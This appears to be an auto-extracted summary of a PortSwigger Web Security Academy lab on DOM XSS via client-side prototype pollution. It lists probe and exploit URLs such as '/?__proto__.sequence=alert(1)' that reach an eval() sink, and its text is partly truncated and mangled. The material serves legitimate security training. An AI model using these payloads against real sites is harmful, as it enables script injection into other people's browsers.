## DOM XSS via an alternative prototype pollution vector

**Category:** prototype_pollution
**Difficulty:** Unknown

### Description
This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

### Solution Steps
Pay attention to the
XSS context
. You need to adjust your payload slightly to ensure that the JavaScript syntax remains valid following your injection.

### Key Payloads
- `Object.prototype`
- `alert()`
- `/?__proto__[foo]=bar`
- `/?__proto__.foo=bar`
- `eval()`
- `searchLoggerAlternative.js`
- `manager.sequence`
- `sequence`
- `/?__proto__.sequence=alert(1)`
- `alert(1)1`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: prototype_pollution

---
*Source: PortSwigger Web Security Academy*
